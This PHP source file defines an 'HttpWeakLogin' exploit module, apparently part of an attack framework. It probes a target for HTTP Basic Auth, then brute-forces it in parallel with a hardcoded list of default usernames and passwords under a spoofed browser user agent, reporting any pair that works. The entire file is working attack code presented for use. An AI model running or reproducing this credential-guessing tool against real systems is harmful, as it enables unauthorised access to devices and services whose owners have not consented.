<?php
class HttpWeakLogin extends Exploit {

	function run(){
		//Check for 401 Auth code
		$code = $this->checkAuth($this->host->ipAdress);
		if($code==401){
			//Curl Multi Handler
			$mh = curl_multi_init();
			$ch = array();
			$i = 0;
			$data = array();
			//Logins
			$logins = array("", "admin", "1234", "root", "guest");
			//Password
			$passwords = array("", "admin", "1234", "root", "guest");
			foreach($logins as $login){
				foreach($passwords as $password){
					$auth = $login . ":" . $password;
					$i++;
					echoCli("Trying to login with: ".$login.":".$password, "notice");
					//Preparing cURL
					$ch[$i] = curl_init($this->host->ipAdress);
					curl_setopt($ch[$i], CURLOPT_USERAGENT, 'Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405');
					curl_setopt($ch[$i], CURLOPT_USERPWD, $auth);
					curl_setopt($ch[$i], CURLOPT_NOBODY, true);
					curl_setopt($ch[$i], CURLOPT_TIMEOUT, 30);
					curl_multi_add_handle($mh, $ch[$i]);
					$data[$i] = $auth;
				}
			}
			//Execute the handles
			$running = null;
			do{
				curl_multi_exec($mh, $running);
			}while($running);
			//Get content and remove handles
			foreach($ch as $i => $c){
				$code = curl_getinfo($c, CURLINFO_HTTP_CODE);
				curl_multi_remove_handle($mh, $c);
				if($code && $code!=401){
					echoCli("Login found! ".$data[$i], "success");
					$this->data = $data[$i];
					break;
				}
			}
			//Close the handles
			curl_multi_close($mh);
			//Got milk?
			if($this->data){
				$this->status = 1;
				return true;
			}
		}else{
			echoCli("Target not Vulnerable", "failure");
		}
	}

	function checkAuth($host){
		$ch = curl_init($host);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (iPad; U; CPU OS 3_2_1 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Mobile/7B405');
		curl_setopt($ch, CURLOPT_NOBODY, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);
		curl_exec($ch);
		$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);
		return $code;
	}
}
?>